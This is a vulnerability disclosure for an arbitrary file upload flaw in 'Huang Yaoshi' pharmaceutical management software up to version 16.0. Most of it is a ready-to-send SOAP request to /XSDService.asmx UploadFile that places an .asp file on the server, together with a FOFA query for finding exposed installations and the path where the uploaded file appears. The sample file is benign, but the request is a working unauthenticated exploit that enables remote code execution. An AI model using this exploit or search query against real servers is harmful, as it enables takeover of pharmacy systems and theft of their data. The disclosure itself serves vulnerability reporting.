## fofa
```
body="XSDService.asmx"
```
![image](https://github.com/user-attachments/assets/b9d2708e-7429-47c3-a346-38f380def928)

## product

 Huang Yaoshi Pharmaceutical Management Software

## Vendor of Product

https://product.11467.com/info/2149952.htm

## VERSION

 Huang Yaoshi Pharmaceutical Management Software <= 16.0

## Vulnerability Type

File Upload

## Description
There is an arbitrary file upload vulnerability in UploadFile under the/XSDService.asmx file of the "Huang Pharmacist" drug management software. Attackers can upload arbitrary files and gain server privileges



## POC：
```
POST /XSDService.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/UploadFile"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <UploadFile xmlns="http://tempuri.org/">
      <filePath></filePath>
      <fileName>1.asp</fileName>
      <buffer>PCUgcmVzcG9uc2Uud3JpdGUoImhlbGxvIHdvcmxkIiklPg==</buffer>
      <Offset>1111</Offset>
    </UploadFile>
  </soap:Body>
</soap:Envelope>
```
![image](https://github.com/user-attachments/assets/2a0bd71d-3282-4c6d-8991-b5d0414a02ef)

Then you can find the uploaded file in the following directory of the website: /Upload2015/1.asp
![image](https://github.com/user-attachments/assets/023c6bdf-9b77-4997-bc2c-df016c5a3861)






